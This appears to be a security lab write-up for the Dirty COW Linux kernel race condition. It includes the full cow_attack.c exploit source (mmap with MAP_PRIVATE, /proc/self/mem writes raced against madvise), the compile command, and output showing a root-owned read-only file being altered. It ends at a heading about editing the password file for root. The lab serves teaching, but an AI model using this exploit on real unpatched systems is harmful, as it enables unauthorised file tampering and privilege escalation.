# Dirty COW Attack Lab
- The Dirty COW vulnerability is an interesting case of the race condition vulnerability, it exists in the Linux kernel since September 2007, and was discovered and exploited in October 2016
- The vulnerability resides in the code of copy-on-write inside Linux kernel, by exploting it, attackers can modify any protected file

## Labsetup
- [`Ubuntu 12.04`](https://seedsecuritylabs.org/labsetup.html)

## Task 1: Modify a Dummy Read-Only File
- objective: write to a read-only file using the Dirty COW vulnerability
- create a dummy file: create `/zzz` with permission `644 (-rw-r--r--)`, and put some random content in it
    ```
    $ sudo touch /zzz
    $ ls -l /zzz
    -rw-r--r-- root root 0 Jan 31 05:26 /zzz
    $ su
    Password:
    # echo 111222333 > /zzz
    # su seed
    $ cat /zzz
    111222333
    $ echo 123 > /zzz
    bash: /zzz: Permission denied
    ```
    - our goal is to replace the pattern `"222"` with `"***"`

- set up the memory mapping thread
    - the program `cow_attack.c` has three threads:
        - the main thread: maps `/zzz` to memory, finds where the pattern `"222"` is, and then creates 2 threads to exploit the Dirty COW vulnerability in the OS kernel
        - the write thread
        - the madvise thred
    ```
    void *map;
    int main(int argc, char *argv[]) {
        pthread_t pth1, pth2;
        struct stat st;
        int file_size;

        // Open the target file in the read-only mode
        int f = open("/zzz", O_RDONLY);
        // Map the file to COW memory using MAP_PRIVATE
        fstat(f, &st);
        file_size = st.st_size;
        map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
        // Find the position of the target string
        char *position = strstr(map, "222");

        // Create 2 threads to launch the attack
        pthread_create(&pth1, NULL, madviseThread, (void*)file_size);
        pthread_create(&pth2, NULL,   writeThread,         position);
        // Wait for the threads to finish
        pthread_join(pth1, NULL);
        pthread_join(pth2, NULL);
        return 0;
    }
    ```
- set up the `write` thread
    - the job of this thread is to replace the string `"222"` in the memory with `"***"`. Since the mapped memory is of COW (Copy-On-Write) type, this thread alone will only be able to modify the contents in a copy of the mapped memory, which will not cause any change to the underlying `/zzz` file
    ```
    void *writeThread(void *arg) {
        char *content = "***";
        off_t offset = (off_t) arg;
        int f = open("/proc/self/mem", O_RDWR);
        while(1) {
            // Move the file pointer to the corresponding position
            lseek(f, offset, SEEK_SET);
            // Write to the memory
            write(f, content, strlen(content));
        }
    }
    ```
- set up the `madvise` thread
    - this thread does only one thing: discarding the private copy of the mapped memory, so the page table can point back to the original mapped memory
    ```
    void *madviseThread(void *arg) {
        int file_size = (int) arg;
        while(1) {
            madvise(map, file_size, MADV_DONTNEED);
        }
    }
    ```
- *launch the attack*
    - if the `write()` and the `madvise()` system calls are invoked alternatively, i.e., one is invoked only after the other is finished, the `write` operation will always be performed on the private copy. The only way for the attack to succeed is to perform the `madvise()` system call while the `write()` system call is still running.
    - compile and run `cow_attack.c` using `gcc -o cow_attack cow_attack.c -lpthread`
    - after a few seconds, we can observe that `/zzz` is modified
    ```
    $ cat /zzz
    111***333
    ```
## Task 2: Modify the Password File to Gain the Root Privilege